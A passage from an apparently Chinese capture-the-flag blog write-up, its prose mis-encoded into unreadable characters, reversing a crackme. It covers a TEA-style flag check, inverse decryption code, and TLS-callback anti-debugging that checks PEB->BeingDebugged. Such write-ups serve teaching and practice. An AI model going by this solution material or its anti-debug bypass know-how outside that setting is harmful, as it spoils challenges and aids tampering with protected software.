data-href="#æ ¡éªŒéƒ¨åˆ†--1-2">bToDå‡½æ•°</button></li><li class="tab"><button type="button" data-href="#æ ¡éªŒéƒ¨åˆ†--1-3">TEAå‡½æ•°</button></li><li class="tab"><button type="button" data-href="#æ ¡éªŒéƒ¨åˆ†--1-4">dToBå‡½æ•°</button></li><li class="tab"><button type="button" data-href="#æ ¡éªŒéƒ¨åˆ†--1-5">æœ€ç»ˆå€¼æ£€å®š</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="æ ¡éªŒéƒ¨åˆ†--1-1"><p>æ ¹æ®<wavy>if ( j_strlen(flag) == 32 )</wavy></p><p>flagä¸º32ä½</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="æ ¡éªŒéƒ¨åˆ†--1-2"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">bToD</span><span class="params">(_DWORD *Q, <span class="type">char</span> *flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> a; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF71EE840F4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">      a |= flag[<span class="number">4</span> * i + j] &lt;&lt; (<span class="number">8</span> * j);</span><br><span class="line">    Q[i] = a;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°flag[4 * i + j]ï¼Œç«‹å³æƒ³åˆ°æŠŠflagçœ‹ä½œäºŒç»´æ•°ç»„ï¼Œä¸€å…±8è¡Œä¸€è¡Œ4ä¸ªå…ƒç´ ï¼Œç”±äºQæ˜¯DWORDå‹ï¼Œflagæ˜¯charå‹ï¼Œè®©aå¼‚æˆ–ç­‰äºä¸€è¡Œflag(ç¬¬iä¸ªè¦flagå·¦ç§»8iä½)ç›¸å½“äºè®©aç­‰äºä¸€è¡Œflagåå‘æ’åˆ—ç»„åˆçš„åå…­è¿›åˆ¶å­—ç¬¦,é‚£ä¹ˆQä¹Ÿä¼šå˜æˆ8ä¸ªå…ƒç´ åˆšå¥½æ¯ä¸ª32ä½</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="æ ¡éªŒéƒ¨åˆ†--1-3"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">  TEA(&amp;Q[<span class="number">2</span> * j], &amp;Q[<span class="number">2</span> * j + <span class="number">1</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">TEA</span><span class="params">(_DWORD *Q2j_, _DWORD *Q2j1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> det; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+64h] [rbp+44h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+84h] [rbp+64h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF71EE840F4);</span><br><span class="line">  det = <span class="number">0x90508D47</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      *Q2j_ += (((<span class="number">32</span> * *Q2j1) ^ (*Q2j1 &gt;&gt; <span class="number">4</span>)) + *Q2j1) ^ (det + tt[det &amp; <span class="number">3</span>]) ^ det;</span><br><span class="line">      *Q2j1 += (((<span class="number">32</span> * *Q2j_) ^ (*Q2j_ &gt;&gt; <span class="number">4</span>)) + *Q2j_) ^ (det + tt[(det &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">      det -= <span class="number">0x77BF7F99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ttæ•°ç»„çš„å€¼æ˜¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tt              db 31h, 0B7h, 0B6h, 31h, 4 dup(0)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ˜¯å…¸å‹çš„TEAåŠ å¯†,å®ƒæ˜¯åˆ†ç»„åŠ å¯†,ä¸”ä½¿ç”¨å¼‚æˆ–,æ¯ä¸€æ­¥éƒ½å¯é€†,å†™å‡ºé€†å‘ä»£ç å°±æ˜¯:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b2; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> e = <span class="number">0x90508D47</span>;</span><br><span class="line">    <span class="type">int</span> tt[<span class="number">8</span>] = &#123; <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j)</span><br><span class="line">            e -= <span class="number">0x77BF7F99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                e += <span class="number">0x77BF7F99</span>;</span><br><span class="line">                b2 -= (((b1 * <span class="number">32</span>) ^ (b1 &gt;&gt; <span class="number">4</span>)) + b1) ^ (e + tt[(e &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">                b1 -= (((<span class="number">32</span> * b2) ^ (b2 &gt;&gt; <span class="number">4</span>)) + b2) ^ (e + tt[e &amp; <span class="number">3</span>]) ^ e;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;Q[k*<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>TEAåŸºæœ¬è§£å†³æ­¥éª¤å°±æ˜¯æ¢å¤detçŠ¶æ€,ç›¸ç­‰å¾ªç¯é•¿åº¦,å†…å®¹åå‘æ’åˆ—,åŠ å˜å‡,å‡å˜åŠ ,å¼‚æˆ–ä¸å˜</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="æ ¡éªŒéƒ¨åˆ†--1-4"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">dtob</span><span class="params">(_DWORD *Q, <span class="type">char</span> *last)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p_spec; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> spec; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">int</span> max; <span class="comment">// [rsp+24h] [rbp+4h]</span></span><br><span class="line">  <span class="type">int</span> b[<span class="number">11</span>]; <span class="comment">// [rsp+48h] [rbp+28h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+74h] [rbp+54h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> a; <span class="comment">// [rsp+94h] [rbp+74h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+B4h] [rbp+94h]</span></span><br><span class="line"></span><br><span class="line">  p_spec = &amp;spec;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">46</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)p_spec = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    p_spec += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  j___CheckForDebuggerJustMyCode((__int64)&amp;byte_7FF71EE840F4, (__int64)last);</span><br><span class="line">  b[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  b[<span class="number">1</span>] = <span class="number">8</span>;</span><br><span class="line">  b[<span class="number">2</span>] = <span class="number">16</span>;</span><br><span class="line">  b[<span class="number">3</span>] = <span class="number">24</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    a = Q[j];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k )</span><br><span class="line">      last[<span class="number">4</span> * j + k] = a &gt;&gt; b[k];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æŠŠQjå³ç§»çš„ç»“æœèµ‹ç»™last,æŠŠlastçœ‹æˆäºŒç»´charæ•°ç»„,æ‰€ä»¥æ ¹æ®bkçš„å€¼å³ç§»ç›¸å½“äºæ¯è¡Œé€†å‘æ’åºlast</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="æ ¡éªŒéƒ¨åˆ†--1-5"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; (<span class="type">int</span>)k &lt; <span class="number">32</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( check[k] != last[k] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_7FF71EE7123F((__int64)aNoNoNo);</span><br><span class="line">        sub_7FF71EE711A9(<span class="string">&quot;%d&quot;</span>, k);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_7FF71EE7123F((__int64)aYes);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:00007FF71EE7E040 check           db 0E0h, 0F3h, 21h, 96h, 97h, 0C7h, 0DEh, 89h, 9Bh, 0CAh</span><br><span class="line">.data:00007FF71EE7E040                                         ; DATA XREF: main_0+119â†‘o</span><br><span class="line">.data:00007FF71EE7E04A                 db 62h, 8Dh, 0B0h, 5Dh, 0FCh, 0D2h, 89h, 55h, 1Ch, 42h</span><br><span class="line">.data:00007FF71EE7E054                 db 50h, 0A8h, 76h, 9Bh, 0EAh, 0B2h, 0C6h, 2Fh, 7Ch, 0CFh</span><br><span class="line">.data:00007FF71EE7E05E                 db 11h, 0DEh</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åªéœ€è¦ä»¤lastç­‰äºcheckç„¶åé€†å‘å³å¯å¾—åˆ°ç­”æ¡ˆ</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="å†™é€†å‘ä»£ç ç„¶åå¾—å‡ºç­”æ¡ˆ">å†™é€†å‘ä»£ç ç„¶åå¾—å‡ºç­”æ¡ˆ</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex_groups</span>(<span class="params">hex_numbers, group_size</span>):</span><br><span class="line">    hex_numbers = hex_numbers.replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    hex_numbers = [num.strip()[<span class="number">2</span>:] <span class="keyword">for</span> num <span class="keyword">in</span> hex_numbers]</span><br><span class="line">    grouped_numbers = [hex_numbers[i:i + group_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_numbers), group_size)]</span><br><span class="line">    reversed_groups = [group[::-<span class="number">1</span>] <span class="keyword">for</span> group <span class="keyword">in</span> grouped_numbers]</span><br><span class="line">    reversed_hex = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;,&#x27;</span>.join([<span class="string">&#x27;&#x27;</span>.join(group) <span class="keyword">for</span> group <span class="keyword">in</span> reversed_groups])</span><br><span class="line">    <span class="keyword">return</span> reversed_hex</span><br><span class="line"></span><br><span class="line">input_hex_numbers = <span class="built_in">input</span>(<span class="string">&quot;Enter hex numbers separated by commas (with optional surrounding brackets): &quot;</span>)</span><br><span class="line">input_group_size = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Enter the group size: &quot;</span>))</span><br><span class="line"></span><br><span class="line">output = reverse_hex_groups(input_hex_numbers, input_group_size)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b2; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> e = <span class="number">0x90508D47</span>;</span><br><span class="line">    <span class="type">int</span> tt[<span class="number">8</span>] = &#123; <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j)</span><br><span class="line">            e -= <span class="number">0x77BF7F99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">33</span>; ++j)</span><br><span class="line">            &#123;</span><br><span class="line">                e += <span class="number">0x77BF7F99</span>;</span><br><span class="line">                b2 -= (((b1 * <span class="number">32</span>) ^ (b1 &gt;&gt; <span class="number">4</span>)) + b1) ^ (e + tt[(e &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">                b1 -= (((<span class="number">32</span> * b2) ^ (b2 &gt;&gt; <span class="number">4</span>)) + b2) ^ (e + tt[e &amp; <span class="number">3</span>]) ^ e;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;Q[k*<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_hex</span>(<span class="params">hex_list</span>):</span><br><span class="line">    reversed_hex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> hex_num <span class="keyword">in</span> hex_list:</span><br><span class="line">        <span class="comment"># ç§»é™¤ &quot;0x&quot;ï¼Œç„¶åæ¯ä¸¤ä½åè½¬</span></span><br><span class="line">        reversed_num = <span class="string">&quot;&quot;</span>.join(<span class="built_in">reversed</span>([hex_num[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(hex_num), <span class="number">2</span>)]))</span><br><span class="line">        reversed_hex += reversed_num</span><br><span class="line">    <span class="keyword">return</span> reversed_hex</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥ä¸€ç»„ä»¥0xå¼€å¤´ï¼Œé€—å·é—´éš”çš„åå…­è¿›åˆ¶æ•°ï¼š&quot;</span>)</span><br><span class="line">hex_list = user_input.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line"><span class="built_in">print</span>(reverse_hex(hex_list))</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¾—å‡ºç­”æ¡ˆ,ç­”æ¡ˆæ˜¯â€¦???</p><p>ç¬¬äºŒæ­¥åšå®Œå°±å‘ç°é—®é¢˜äº†:</p><details class="folding-tag" ><summary> é”™è¯¯çš„ç­”æ¡ˆ </summary>              <div class='content'>              <img src="https://s2.loli.net/2023/12/18/I4YS71EPxvuor6k.png" alt="fake_answer" style="zoom:33%;" />              </div>            </details><p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢??</p><hr><h2 id="é‡å›ç»†èŠ‚">é‡å›ç»†èŠ‚</h2><p>è¿˜æœ‰ä»€ä¹ˆæ²¡æœ‰æ£€æŸ¥å‘¢,åªæœ‰åè°ƒè¯•äº†å§â€¦</p><p>é‚£ä¹ˆæ‰“å¼€j___CheckForDebuggerJustMyCode:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall _CheckForDebuggerJustMyCode(_BYTE *a1)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_7FF71EE7E9C4 )</span><br><span class="line">      GetCurrentThreadId();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªæ²¡æœ‰è¿”å›å€¼çš„å‡½æ•°,å¹¶ä¸”å”¯ä¸€å¯èƒ½æ‰§è¡Œçš„å‰¯ä½œç”¨æ˜¯GetCurrentThreadId(),ç„¶è€Œè¿™ä¸ªå‡½æ•°æ˜¯è¿”å›å½“å‰çº¿ç¨‹å¥æŸ„,æ‰€ä»¥è¿™ä¸ªå‡½æ•°<code>åªæ˜¯åå­—å«æ£€æŸ¥debuggerçš„å‡½æ•°</code>,å®é™…ä¸Šæ²¡æœ‰ä½œç”¨!!</p><p>ä½†æ˜¯æˆ‘ä»¬è°ƒè¯•çš„æ—¶å€™ç¡®å®ä¼šé—ªé€€,é‚£ä¹ˆæˆ‘ä»¬å†è¯•ä¸€è¯•</p><p>æ— è®ºæ˜¯ä¸‹æ–­ç‚¹è¿˜æ˜¯ç›´æ¥è°ƒè¯•éƒ½ä¼šç›´æ¥é—ªé€€,äºæ˜¯æˆ‘å°è¯•ç”¨remote windows debuggerè¯•ä¸€è¯•ç‚¹å‡»è°ƒè¯•:</p><details class="folding-tag" ><summary> è·å¾—æç¤º </summary>              <div class='content'>              <img src="https://s2.loli.net/2023/12/18/ZILDtzsTNHidB2c.png" alt="image-20231218114708422" style="zoom: 67%;" />              </div>            </details><p>é‚£ä¹ˆè¦æ˜¯å¯ä»¥ç”¨è¿™ä¸ªæç¤ºæŠŠåè°ƒè¯•ç ´æ‰å°±å¯ä»¥è°ƒè¯•äº†</p><p>åœ¨å­—ç¬¦ä¸²åˆ—è¡¨æŸ¥çœ‹è¿™ä¸ªæ–‡å­—,é€šè¿‡äº¤å‰å¼•ç”¨æ¥æŸ¥çœ‹å“ªä¸ªå‡½æ•°ä½¿ç”¨äº†è¿™ä¸ª</p><p>æ‰¾åˆ°äº†è¿™ä¸ªå‡½æ•°:</p><details class="folding-tag" ><summary> sub_7FF7AB081AE0 </summary>              <div class='content'>              <img src="https://s2.loli.net/2023/12/18/JOHgjAnfm2Vkqdo.png" alt="sub_7FF7AB081AE0" style="zoom:80%;" /><p>åç¼–è¯‘ä¹‹åæ˜¯:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">sub_7FF7AB081AE0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF7AB0940F4);</span><br><span class="line">  sub_7FF7AB0811A9(<span class="string">&quot;SomeThing Go Wrong\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>              </div>            </details><p>é‚£ä¹ˆç»§ç»­æ‰¾äº¤å‰å¼•ç”¨,é‡å¤å¤šæ¬¡åå®šä½åˆ°ä¸¤ä¸ªå‡½æ•°</p><details class="folding-tag" ><summary> 2ä¸ªTlsCallBack </summary>              <div class='content'>              <p><img src="https://s2.loli.net/2023/12/18/zC6dkSba5EwcD97.png" alt="image-20231218121518231"></p>              </div>            </details><p>æ‰¾åˆ°è¿™ä¸¤ä¸ªå‡½æ•°</p><details class="folding-tag" ><summary> TlsCallBack </summary>              <div class='content'>              <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">TlsCallback_0_0</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int16 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+44h] [rbp+24h]</span></span><br><span class="line"></span><br><span class="line">  j___CheckForDebuggerJustMyCode(byte_7FF7AB0940F4);</span><br><span class="line">  v2 = NtCurrentPeb();</span><br><span class="line">  LOBYTE(v2) = v2-&gt;BeingDebugged;</span><br><span class="line">  <span class="keyword">if</span> ( v2-&gt;BeingDebugged == <span class="number">4</span> )</span><br><span class="line">    sub_7FF7AB081AE0();</span><br><span class="line">  result = a2 &amp; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (a2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      j_oooo(off_7FF7AB08E008 + i + <span class="number">1</span>, a2);</span><br><span class="line">      result = (i + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title 